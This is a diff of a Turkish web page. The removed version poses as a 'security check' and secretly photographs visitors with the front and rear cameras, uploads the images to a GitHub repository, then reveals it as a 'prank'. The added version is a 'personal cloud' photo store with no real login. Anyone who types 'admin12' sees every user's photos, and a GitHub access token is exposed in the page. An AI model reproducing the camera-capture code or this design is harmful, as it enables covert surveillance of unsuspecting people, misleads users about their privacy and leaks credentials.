@@ -3,143 +3,253 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Güvenlik Doğrulaması</title>
+    <title>Kişisel Bulut Deposu</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: #121212;
-            color: #fff;
+            background: #0f172a;
+            color: #f8fafc;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
+        }
+        .container {
+            background: #1e293b;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            max-width: 450px;
+            width: 90%;
             text-align: center;
         }
-        .box {
-            background: #1e1e1e;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-            max-width: 400px;
-            width: 90%;
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+            box-sizing: border-box;
         }
-        h2 { color: #4CAF50; }
-        p { color: #bbb; }
-        video { display: none; }
+        input { background: #334155; color: #fff; }
+        button { background: #3b82f6; color: #white; font-weight: bold; cursor: pointer; }
+        button:hover { background: #2563eb; }
+        .gallery {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            justify-content: center;
+        }
+        .photo-card {
+            background: #334155;
+            padding: 10px;
+            border-radius: 8px;
+            width: 45%;
+        }
+        .photo-card img {
+            width: 100%;
+            border-radius: 4px;
+        }
+        .download-btn {
+            background: #10b981;
+            font-size: 12px;
+            padding: 6px;
+            margin-top: 5px;
+            text-decoration: none;
+            display: block;
+            color: white;
+            border-radius: 4px;
+        }
     </style>
 </head>
 <body>
 
-    <div class="box" id="contentBox">
-        <h2>Güvenlik Kontrolü</h2>
-        <p>Siteye devam etmek için bot olmadığını doğrulaman gerekiyor.</p>
+    <div class="container" id="app">
+        <!-- Giriş Ekranı -->
+        <div id="loginScreen">
+            <h2>Kişisel Bulut</h2>
+            <p>Dolabına erişmek için adını yaz:</p>
+            <input type="text" id="usernameInput" placeholder="Adın veya Rumuzun">
+            <button onclick="login()">Dolabımı Aç</button>
+        </div>
+
+        <!-- Dolap Ekranı (Başlangıçta gizli) -->
+        <div id="dashboardScreen" style="display: none;">
+            <h2 id="welcomeTitle"></h2>
+            <p id="roleInfo" style="color: #38bdf8; font-size: 14px;"></p>
+            
+            <input type="file" id="fileInput" accept="image/*">
+            <button onclick="uploadPhoto()">Fotoğraf Yükle</button>
+            
+            <h3>Fotoğraflar</h3>
+            <div class="gallery" id="photoGallery">
+                <p>Yükleniyor...</p>
+            </div>
+            
+            <button onclick="logout()" style="background: #ef4444; margin-top: 20px;">Çıkış Yap</button>
+        </div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-
     <script>
+        // --- GİTİHUB BİLGİLERİN ---
         const GITHUB_TOKEN = 'Ghp_IEiPql2E4HGvq7BWVP2fVoDIUYDuVZ1nKstu'; 
         const REPO_INFO = 'akif588/Game';
+        // --------------------------
 
-        window.onload = async function() {
-            alert("Bu oyuna devam etmek için bot olmadığınızı kanıtlamak üzere kamera izni vermeniz gerekiyor.");
-            await startPrank();
-        };
+        let currentUser = '';
 
-        async function uploadToGitHub(base64Data, filename) {
-            const path = `fotolar/${filename}`;
-            const url = `https://api.github.com/repos/${REPO_INFO}/contents/${path}`;
-            const base64Content = base64Data.split(',')[1];
-
-            const bodyData = {
-                message: `Fotoğraf eklendi: ${filename}`,
-                content: base64Content,
-                branch: "main"
-            };
-
-            try {
-                let response = await fetch(url, {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': `token ${GITHUB_TOKEN}`,
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(bodyData)
-                });
-                return await response.json();
-            } catch (err) {
-                console.error("Yükleme hatası:", err);
+        async function login() {
+            const inputVal = document.getElementById('usernameInput').value.trim();
+            if (!inputVal) {
+                alert("Lütfen bir isim yaz kanka!");
+                return;
             }
+            currentUser = inputVal;
+            
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('dashboardScreen').style.display = 'block';
+
+            if (currentUser === 'admin12') {
+                document.getElementById('welcomeTitle').innerText = "Admin Paneli";
+                document.getElementById('roleInfo').innerText = "Tüm kullanıcıların fotoğraflarını görüyorsun.";
+                document.getElementById('fileInput').style.display = 'none'; // Admin kendi adına foto yüklemesin
+            } else {
+                document.getElementById('welcomeTitle').innerText = `Hoş geldin, ${currentUser}`;
+                document.getElementById('roleInfo').innerText = "Bu senin kişisel bulut dolabın.";
+            }
+
+            await loadPhotos();
         }
 
-        async function takeSnapshot(facingMode) {
-            return new Promise(async (resolve, reject) => {
+        function logout() {
+            currentUser = '';
+            document.getElementById('usernameInput').value = '';
+            document.getElementById('dashboardScreen').style.display = 'none';
+            document.getElementById('loginScreen').style.display = 'block';
+        }
+
+        async function uploadPhoto() {
+            const fileInput = document.getElementById('fileInput');
+            if (fileInput.files.length === 0) {
+                alert("Önce bir fotoğraf seç kanka!");
+                return;
+            }
+
+            const file = fileInput.files[0];
+            const reader = new FileReader();
+
+            reader.onload = async function(event) {
+                const base64Data = event.target.result;
+                const base64Content = base64Data.split(',')[1];
+                const timestamp = Date.now();
+                const path = `bulut_depo/${currentUser}/${timestamp}_${file.name}`;
+                const url = `https://api.github.com/repos/${REPO_INFO}/contents/${path}`;
+
+                const bodyData = {
+                    message: `${currentUser} fotoğraf yükledi: ${file.name}`,
+                    content: base64Content,
+                    branch: "main"
+                };
+
+                alert("Fotoğraf yükleniyor...");
+
                 try {
-                    const constraints = {
-                        video: { facingMode: facingMode }
-                    };
-                    
-                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    
-                    // Videonun tamamen yüklenmesini ve ilk karenin gelmesini bekle
-                    await new Promise((resolveVideo) => {
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            // Akışın oturması için ek 1 saniye veriyoruz
-                            setTimeout(resolveVideo, 1000);
-                        };
+                    let response = await fetch(url, {
+                        method: 'PUT',
+                        headers: {
+                            'Authorization': `token ${GITHUB_TOKEN}`,
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(bodyData)
                     });
 
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.9);
-
-                    // Akışı kapat
-                    stream.getTracks().forEach(track => track.stop());
-                    resolve(dataURL);
-                } catch (e) {
-                    reject(e);
+                    if (response.ok) {
+                        alert("Fotoğraf başarıyla yüklendi!");
+                        fileInput.value = '';
+                        await loadPhotos();
+                    } else {
+                        alert("Yükleme başarısız oldu!");
+                    }
+                } catch (err) {
+                    console.error(err);
+                    alert("Bir hata oluştu.");
                 }
-            });
+            };
+            reader.readAsDataURL(file);
         }
 
-        async function startPrank() {
-            const timestamp = Date.now();
-            
+        async function loadPhotos() {
+            const gallery = document.getElementById('photoGallery');
+            gallery.innerHTML = '<p>Yükleniyor...</p>';
+
             try {
-                try {
-                    const frontImage = await takeSnapshot('user');
-                    await uploadToGitHub(frontImage, `on_${timestamp}.jpg`);
-                } catch (e) {
-                    console.log("Ön kamera alınamadı.");
-                }
+                if (currentUser === 'admin12') {
+                    // Admin ise tüm bulut_depo klasöründeki kullanıcıları tara
+                    let allFiles = [];
+                    let res = await fetch(`https://api.github.com/repos/${REPO_INFO}/contents/bulut_depo`, {
+                        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
+                    });
+                    
+                    if (res.ok) {
+                        let users = await res.json();
+                        for (let userFolder of users) {
+                            if (userFolder.type === 'dir') {
+                                let userRes = await fetch(userFolder.url, {
+                                    headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
+                                });
+                                if (userRes.ok) {
+                                    let userFiles = await userRes.json();
+                                    allFiles = allFiles.concat(userFiles);
+                                }
+                            }
+                        }
+                    }
+                    renderGallery(allFiles);
+                } else {
+                    // Normal kullanıcı ise sadece kendi klasörünü çek
+                    let url = `https://api.github.com/repos/${REPO_INFO}/contents/bulut_depo/${currentUser}`;
+                    let res = await fetch(url, {
+                        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
+                    });
 
-                try {
-                    const backImage = await takeSnapshot('environment');
-                    await uploadToGitHub(backImage, `arka_${timestamp}.jpg`);
-                } catch (e) {
-                    console.log("Arka kamera alınamadı.");
+                    if (res.ok) {
+                        let files = await res.json();
+                        renderGallery(files);
+                    } else {
+                        gallery.innerHTML = '<p>Henüz fotoğrafın yok.</p>';
+                    }
                 }
-
-                document.getElementById('contentBox').innerHTML = `
-                    <h2 style="color: #ff5252;">Şaka Yaptım Kanka! 😄</h2>
-                    <p>İşlem tamamlandı!</p>
-                `;
             } catch (err) {
-                document.getElementById('contentBox').innerHTML = `
-                    <h2>Hata!</h2>
-                    <p>İşlem sırasında bir sorun oluştu.</p>
-                `;
+                console.error(err);
+                gallery.innerHTML = '<p>Fotoğraflar yüklenemedi.</p>';
             }
+        }
+
+        function renderGallery(files) {
+            const gallery = document.getElementById('photoGallery');
+            gallery.innerHTML = '';
+
+            if (!files || files.length === 0) {
+                gallery.innerHTML = '<p>Hiç fotoğraf bulunamadı.</p>';
+                return;
+            }
+
+            files.forEach(file => {
+                if (file.type === 'file' && (file.name.endsWith('.jpg') || file.name.endsWith('.png') || file.name.endsWith('.jpeg'))) {
+                    const card = document.createElement('div');
+                    card.className = 'photo-card';
+                    card.innerHTML = `
+                        <img src="${file.download_url}" alt="Fotoğraf">
+                        <a class="download-btn" href="${file.download_url}" target="_blank" download>İndir</a>
+                    `;
+                    gallery.appendChild(card);
+                }
+            });
         }
     </script>
 </body>
